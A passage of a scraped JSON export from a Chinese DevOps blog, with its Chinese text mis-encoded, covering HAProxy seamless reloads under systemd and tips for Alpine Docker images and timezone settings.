init script so that a faulty configuration doesn\u0026#39;t prevent the system from booting. -W : master-worker mode. It is equivalent to the \u0026#34;master-worker\u0026#34; keyword in the \u0026#34;global\u0026#34; section of the configuration. This mode will launch a \u0026#34;master\u0026#34; which will monitor the \u0026#34;workers\u0026#34;. Using this mode, you can reload HAProxy directly by sending a SIGUSR2 signal to the master. The master-worker mode is compatible either with the foreground or daemon mode. It is recommended to use this mode with multiprocess and systemd. -Ws : master-worker mode with support of `notify` type of systemd service. This option is only available when HAProxy was built with `USE_SYSTEMD` build option enabled. å…·ä½“çš„å¯åŠ¨è„šæœ¬ï¼š/etc/systemd/system/haproxy.service\n[Unit] Description=HAProxy Load Balancer After=network-online.target Wants=network-online.target [Service] Environment=\u0026#34;CONFIG=/etc/haproxy/haproxy.cfg\u0026#34; \u0026#34;PIDFILE=/run/haproxy.pid\u0026#34; ExecStartPre=/usr/sbin/haproxy -f $CONFIG -c -q ExecStart=/usr/sbin/haproxy -Ws -f $CONFIG -p $PIDFILE ExecReload=/usr/sbin/haproxy -f $CONFIG -c -q ExecReload=/bin/kill -USR2 $MAINPID KillMode=mixed Restart=always SuccessExitStatus=143 Type=notify # The following lines leverage SystemD\u0026#39;s sandboxing options to provide # defense in depth protection at the expense of restricting some flexibility # in your setup (e.g. placement of your configuration files) or possibly # reduced performance. See systemd.service(5) and systemd.exec(5) for further # information. # NoNewPrivileges=true # ProtectHome=true # If you want to use \u0026#39;ProtectSystem=strict\u0026#39; you should whitelist the PIDFILE, # any state files and any other files written using \u0026#39;ReadWritePaths\u0026#39; or # \u0026#39;RuntimeDirectory\u0026#39;. # ProtectSystem=true # ProtectKernelTunables=true # ProtectKernelModules=true # ProtectControlGroups=true # If your SystemD version supports them, you can add: @reboot, @swap, @sync # SystemCallFilter=~@cpu-emulation @keyring @module @obsolete @raw-io [Install] WantedBy=multi-user.target äºŒã€éªŒè¯ éªŒè¯æ˜¯å¦çœŸçš„æ˜¯æ— ç¼é‡è½½çš„æ­¥éª¤å¦‚ä¸‹ï¼š\nåœ¨haproxy.cfgçš„globalæ®µè½ä¸­åŠ å…¥statçš„é…ç½®ï¼š\nstats socket /var/run/haproxy.sock level admin expose-fd listeners process 1 è¿è¡Œä¸€ä¸ªä¸æ–­å¾ªç¯é‡å¯çš„è„šæœ¬ï¼š\nwhile true ; do systemctl reload haproxy ; sleep 3 ; done ç”¨ apache çš„å‹æµ‹å·¥å…· ab æ¥å‹ä¸€ä¸‹ã€‚\nSend request while service is reloading:\nab -r -c 20 -n 100000 http://127.0.0.1/ æœ€åæ£€æŸ¥ç»“æœä¸­ \u0026ldquo;Failed requests\u0026rdquo; æ˜¯å¦ä¸ºé›¶å°±å¯ä»¥äº†\n","permalink":"https://rendoumi.com/posts/20211104-haproxy_restart/","summary":"\u003cp\u003eNginx å¯ä»¥ç”¨ kill -HUP æ¥é‡å¯ï¼Œä¸ä¼šä¸¢å¤±å·²å»ºè¿æ¥ã€‚Haproxy å¦‚ä½•åšæ‰èƒ½åšåˆ° zero downtime æ— ç¼é‡è½½å‘¢ï¼Ÿ\u003c/p\u003e\n\u003cp\u003eåšæ³•å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003ch2 id=\"ä¸€é…ç½®\"\u003eä¸€ã€é…ç½®\u003c/h2\u003e\n\u003cp\u003eç¼–è¯‘harpoxyçš„æ—¶å€™å¸¦ä¸Šå‚æ•° USE_SYSTEMDï¼Œé€‰æ‹© Haproxy 1.8 ä»¥ä¸Šç‰ˆæœ¬\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emake \u003cspan class=\"nv\"\u003eTARGET\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003elinux2628 \u003cspan class=\"nv\"\u003eUSE_GETADDRINFO\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"nv\"\u003eUSE_ZLIB\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"nv\"\u003eUSE_REGPARM\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"nv\"\u003eUSE_OPENSSL\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  \u003cspan class=\"nv\"\u003eUSE_SYSTEMD\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"nv\"\u003eUSE_PCRE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"nv\"\u003eUSE_PCRE_JIT\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"nv\"\u003eUSE_NS\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emake install\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eHaproxyæ— ç¼é‡è½½æŠ€æœ¯ï¼š\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eæ—§è¿›ç¨‹å½“å‰ç®¡ç†çš„è¿æ¥æ ¹æ® file descriptor æ–‡ä»¶æè¿°ç¬¦é€šè¿‡ socket å¥—æ¥å­—ä¼ è¾“åˆ°æ–°è¿›ç¨‹ã€‚\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œæ–‡ä»¶socketï¼ˆunix socketï¼‰çš„è¿æ¥æ²¡æœ‰æ–­å¼€ã€‚\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eæ–°è¿›ç¨‹åœ¨å……å½“ master-worker ä¸»å·¥ä½œè€…çš„åŒæ—¶æ‰§è¡Œæ­¤ä»»åŠ¡ã€‚\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eç»¼ä¸Šæ‰€è¿°ï¼Œé€šè¿‡ä½¿ç”¨unix socketæ¥ç»´æŠ¤è¿æ¥çŠ¶æ€å¹¶åœ¨æ—§è¿›ç¨‹å’Œæ–°è¿›ç¨‹ä¹‹é—´ä¼ é€’ï¼Œé˜²æ­¢äº†è¿æ¥ä¸¢å¤±ã€‚\u003c/p\u003e\n\u003cp\u003ehaproxy çš„è¿è¡Œä½¿ç”¨ Systemd é‡è½½ï¼Œä½¿ç”¨ -Ws æ–¹å¼ã€‚ ï¼ˆæ­¤å¤–ï¼Œåœ¨æ„å»ºæ—¶å¿…é¡»å¯ç”¨ USE_SYSTEMDï¼‰\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003e-D : start as a daemon. The process detaches from the current terminal after\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003eforking, and errors are not reported anymore in the terminal. It is\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003eequivalent to the \u0026#34;daemon\u0026#34; keyword in the \u0026#34;global\u0026#34; section of the\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003econfiguration. It is recommended to always force it in any init script so\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003ethat a faulty configuration doesn\u0026#39;t prevent the system from booting.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003e-W : master-worker mode. It is equivalent to the \u0026#34;master-worker\u0026#34; keyword in\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003ethe \u0026#34;global\u0026#34; section of the configuration. This mode will launch a \u0026#34;master\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003ewhich will monitor the \u0026#34;workers\u0026#34;. Using this mode, you can reload HAProxy\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003edirectly by sending a SIGUSR2 signal to the master.  The master-worker mode\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003eis compatible either with the foreground or daemon mode.  It is\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003erecommended to use this mode with multiprocess and systemd.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003e-Ws : master-worker mode with support of `notify` type of systemd service.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003eThis option is only available when HAProxy was built with `USE_SYSTEMD`\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003ebuild option enabled.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå…·ä½“çš„å¯åŠ¨è„šæœ¬ï¼š/etc/systemd/system/haproxy.service\u003c/p\u003e","title":"Haproxyçš„Zero downtimeé‡å¯å¦‚ä½•åš"},{"content":"ç”¨ alphine é•œåƒçš„ä¸€äº›å¸¸ç”¨æŠ€å·§ï¼š\nä¼šéšæ—¶å¢åŠ ï¼š\nä¸€ã€ä¿®æ”¹æºï¼Œç”¨å›½å¤–çš„æºéå¸¸æ…¢ï¼Œæ›¿æ¢æˆå›½å†…çš„ä¸­ç§‘å¤§æº sed -i \u0026#39;s/dl-cdn.alpinelinux.org/mirrors.ustc.edu.cn/g\u0026#39; /etc/apk/repositories äºŒã€æ›´æ–°apkåº“ apk update ä¸‰ã€å®‰è£…è½¯ä»¶ #å®‰è£…telnet apk add busybox-extras #å®‰è£…curl apk add curl #å®‰è£…æ—¶é—´ç»„ä»¶ apk add tzdata #æ›´æ–°å¹¶ä¸”å®‰è£…è½¯ä»¶ apk add --update tzdata å››ã€è¿›å…¥å®¹å™¨ä¸€æ­¥æ‰§è¡Œæ¢æºã€æ›´æ–°ã€å®‰è£… sed -i \u0026#39;s/dl-cdn.alpinelinux.org/mirrors.ustc.edu.cn/g\u0026#39; /etc/apk/repositories \u0026amp;\u0026amp; apk update \u0026amp;\u0026amp; apk add curl \u0026amp;\u0026amp; apk add busybox-extras äº”ã€è§£å†³ç¼ºå°‘glibcåº“çš„é—®é¢˜ å¦‚æœä¸lnä¼šæŠ¥é”™ï¼ŒåŸå› æ˜¯ç¼ºå°‘glibcåº“ï¼ï¼ï¼è§£å†³æ–¹æ³•å¦‚ä¸‹ï¼š\nRUN mkdir /lib64 \u0026amp;\u0026amp; \\ ln -s /lib/libc.musl-x86_64.so.1 /lib64/ld-linux-x86-64.so.2 å…­ã€ä¸€äº›è°ƒè¯•çš„CMD CMD [\u0026#34;/bin/bash\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;while true; do echo hi; sleep 10; done\u0026#34;] kubectl run curlpod --image=radial/busyboxplus:curl --command -- /bin/sh -c \u0026#34;while true; do echo hi; sleep 10; done\u0026#34; ä¸ƒã€podçš„ç­‰å¾…æŠ€å·§ è¿™å„¿é‡Œå¯åŠ¨æ­£å¼çš„podä¹‹å‰ï¼Œå…ˆä¸´æ—¶èµ·äº†ä¸¤ä¸ªå®¹å™¨ç­‰å¾…å…¶ä»–æœåŠ¡çš„å®Œæˆ\ncontainers: - name: myapp-container image: busybox command: [\u0026#39;sh\u0026#39;, \u0026#39;-c\u0026#39;, \u0026#39;echo The app is running! \u0026amp;\u0026amp; sleep 3600\u0026#39;] initContainers: - name: init-myservice image: busybox command: [\u0026#39;sh\u0026#39;, \u0026#39;-c\u0026#39;, \u0026#39;until nslookup myservice; do echo waiting for myservice; sleep 2; done;\u0026#39;] - name: init-mydb image: busybox command: [\u0026#39;sh\u0026#39;, \u0026#39;-c\u0026#39;, \u0026#39;until nslookup mydb; do echo waiting for mydb; sleep 2; done;\u0026#39;] ","permalink":"https://rendoumi.com/posts/20211104-alphine_usage/","summary":"\u003cp\u003eç”¨ alphine é•œåƒçš„ä¸€äº›å¸¸ç”¨æŠ€å·§ï¼š\u003c/p\u003e\n\u003cp\u003eä¼šéšæ—¶å¢åŠ ï¼š\u003c/p\u003e\n\u003ch2 id=\"ä¸€ä¿®æ”¹æºç”¨å›½å¤–çš„æºéå¸¸æ…¢æ›¿æ¢æˆå›½å†…çš„ä¸­ç§‘å¤§æº\"\u003eä¸€ã€ä¿®æ”¹æºï¼Œç”¨å›½å¤–çš„æºéå¸¸æ…¢ï¼Œæ›¿æ¢æˆå›½å†…çš„ä¸­ç§‘å¤§æº\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esed -i \u003cspan class=\"s1\"\u003e\u0026#39;s/dl-cdn.alpinelinux.org/mirrors.ustc.edu.cn/g\u0026#39;\u003c/span\u003e /etc/apk/repositories\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"äºŒæ›´æ–°apkåº“\"\u003eäºŒã€æ›´æ–°apkåº“\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapk update\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"ä¸‰å®‰è£…è½¯ä»¶\"\u003eä¸‰ã€å®‰è£…è½¯ä»¶\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#å®‰è£…telnet\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapk add busybox-extras\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#å®‰è£…curl\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapk add curl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#å®‰è£…æ—¶é—´ç»„ä»¶\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapk add tzdata\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#æ›´æ–°å¹¶ä¸”å®‰è£…è½¯ä»¶\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapk add --update tzdata\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"å››è¿›å…¥å®¹å™¨ä¸€æ­¥æ‰§è¡Œæ¢æºæ›´æ–°å®‰è£…\"\u003eå››ã€è¿›å…¥å®¹å™¨ä¸€æ­¥æ‰§è¡Œæ¢æºã€æ›´æ–°ã€å®‰è£…\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esed -i \u003cspan class=\"s1\"\u003e\u0026#39;s/dl-cdn.alpinelinux.org/mirrors.ustc.edu.cn/g\u0026#39;\u003c/span\u003e /etc/apk/repositories \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e apk update \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e apk add curl \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e apk add busybox-extras\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"äº”è§£å†³ç¼ºå°‘glibcåº“çš„é—®é¢˜\"\u003eäº”ã€è§£å†³ç¼ºå°‘glibcåº“çš„é—®é¢˜\u003c/h2\u003e\n\u003cp\u003eå¦‚æœä¸lnä¼šæŠ¥é”™ï¼ŒåŸå› æ˜¯ç¼ºå°‘glibcåº“ï¼ï¼ï¼è§£å†³æ–¹æ³•å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eRUN mkdir /lib64 \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\ \u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ln -s /lib/libc.musl-x86_64.so.1 /lib64/ld-linux-x86-64.so.2  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"å…­ä¸€äº›è°ƒè¯•çš„cmd\"\u003eå…­ã€ä¸€äº›è°ƒè¯•çš„CMD\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eCMD \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;/bin/bash\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;-c\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;while true; do echo hi; sleep 10; done\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekubectl run curlpod --image\u003cspan class=\"o\"\u003e=\u003c/span\u003eradial/busyboxplus:curl --command -- /bin/sh -c \u003cspan class=\"s2\"\u003e\u0026#34;while true; do echo hi; sleep 10; done\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"ä¸ƒpodçš„ç­‰å¾…æŠ€å·§\"\u003eä¸ƒã€podçš„ç­‰å¾…æŠ€å·§\u003c/h2\u003e\n\u003cp\u003eè¿™å„¿é‡Œå¯åŠ¨æ­£å¼çš„podä¹‹å‰ï¼Œå…ˆä¸´æ—¶èµ·äº†ä¸¤ä¸ªå®¹å™¨ç­‰å¾…å…¶ä»–æœåŠ¡çš„å®Œæˆ\u003c/p\u003e","title":"alphineé•œåƒçš„ä½¿ç”¨æŠ€å·§"},{"content":"æˆ‘ä»¬éƒ½å–œæ¬¢ç”¨ alphine çš„é•œåƒåšåº•åŒ…ï¼Œæ¥ç”Ÿäº§è‡ªå·±çš„é•œåƒ\nalphine çš„åº•åŒ…çš„æ—¶é—´è®¾å®šå°±éå¸¸é‡è¦äº†\nç›´æ¥ç»™å‡º Dockerfile\nFROM alpine:3.12 # latest certs RUN apk add ca-certificates --no-cache \u0026amp;\u0026amp; update-ca-certificates # timezone support ENV TZ=Asia/Shanghai RUN apk add --update tzdata --no-cache \u0026amp;\u0026amp;\\ cp /usr/share/zoneinfo/${TZ} /etc/localtime \u0026amp;\u0026amp;\\ echo $TZ \u0026gt; /etc/timezone # install chrony and place default conf which can be overridden with volume RUN apk add --no-cache chrony \u0026amp;\u0026amp; mkdir -p /etc/chrony COPY chrony.conf /etc/chrony/. # port exposed EXPOSE 123/udp # start CMD [ \u0026#34;/usr/sbin/chronyd\u0026#34;, \u0026#34;-d\u0026#34;, \u0026#34;-s\u0026#34;] æ—¶é—´è®¾å®šé‡è¦çš„å°±æ˜¯ä¸‹é¢è¿™å‡ è¡Œ\n# timezone support ENV TZ=Asia/Shanghai RUN apk add --update tzdata --no-cache \u0026amp;\u0026amp;\\ cp /usr/share/zoneinfo/${TZ} /etc/localtime \u0026amp;\u0026amp;\\ echo $TZ \u0026gt; /etc/timezone è¿˜æœ‰å¦‚æœåœ¨ image: maven:3.5-jdk-8-alpine è¿™ç§é•œåƒé‡Œï¼Œæ— è®ºæ€ä¹ˆæ”¹æ—¶é—´éƒ½ä¸æ˜¯ä¸œå…«åŒºï¼Œå¯ä»¥è¯•è¯•ä¸‹é¢çš„å‘½ä»¤ï¼š\nexport COMMIT_TIME=$(TZ=CST-8 date +%F-%H-%M) ","permalink":"https://rendoumi.com/posts/20211103-alphine_timezone/","summary":"\u003cp\u003eæˆ‘ä»¬éƒ½å–œæ¬¢ç”¨ alphine çš„é•œåƒåšåº•åŒ…ï¼Œæ¥ç”Ÿäº§è‡ªå·±çš„é•œåƒ\u003c/p\u003e\n\u003cp\u003ealphine çš„åº•åŒ…çš„æ—¶é—´è®¾å®šå°±éå¸¸é‡è¦äº†\u003c/p\u003e\n\u003cp\u003eç›´æ¥ç»™å‡º Dockerfile\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eFROM alpine:3.12\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# latest certs\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eRUN apk add ca-certificates --no-cache \u0026amp;\u0026amp; update-ca-certificates\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# timezone support\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eENV TZ\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003eAsia/Shanghai\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eRUN apk add --update tzdata --no-cache \u0026amp;\u0026amp;\\\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003ecp /usr/share/zoneinfo/${TZ} /etc/localtime \u0026amp;\u0026amp;\\\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003eecho $TZ \u0026gt; /etc/timezone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# install chrony and place default conf which can be overridden with volume\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eRUN apk add --no-cache chrony \u0026amp;\u0026amp; mkdir -p /etc/chrony\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eCOPY chrony.conf /etc/chrony/.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# port exposed\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eEXPOSE 123/udp\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# start\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eCMD [ \u0026#34;/usr/sbin/chronyd\u0026#34;, \u0026#34;-d\u0026#34;, \u0026#34;-s\u0026#34;]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ—¶é—´è®¾å®šé‡è¦çš„å°±æ˜¯ä¸‹é¢è¿™å‡ è¡Œ\u003c/p\u003e","title":"alphineé•œåƒä¸­timezoneçš„è®¾å®š"},{"content":"å…¶å®æˆ‘ä»¬çš„ç”Ÿäº§ç¯å¢ƒä¸€ç›´æ˜¯ KVM ï¼Œç„¶åç”¨ shell è„šæœ¬æ§åˆ¶è™šæœºçš„ç”Ÿæˆï¼Œä¹Ÿæ˜¯ç”¨åˆ°äº† Cloud-init çš„æ ‡å‡†é•œåƒã€‚\nå¬è¯´ Proxmox ä¹Ÿå¾ˆä¸é”™ï¼Œäºæ˜¯æƒ³çœ‹çœ‹èƒ½å¦ä¹Ÿåœ¨ç”Ÿäº§ç¯å¢ƒä¸­ç”¨ä¸Š\nå¦‚æœåœ¨ç”Ÿäº§ç¯å¢ƒä¸­ç”¨ï¼Œå¿…é¡»è¦è®© proxmox æ”¯æŒ cloud-init ï¼Œå¦åˆ™æ— 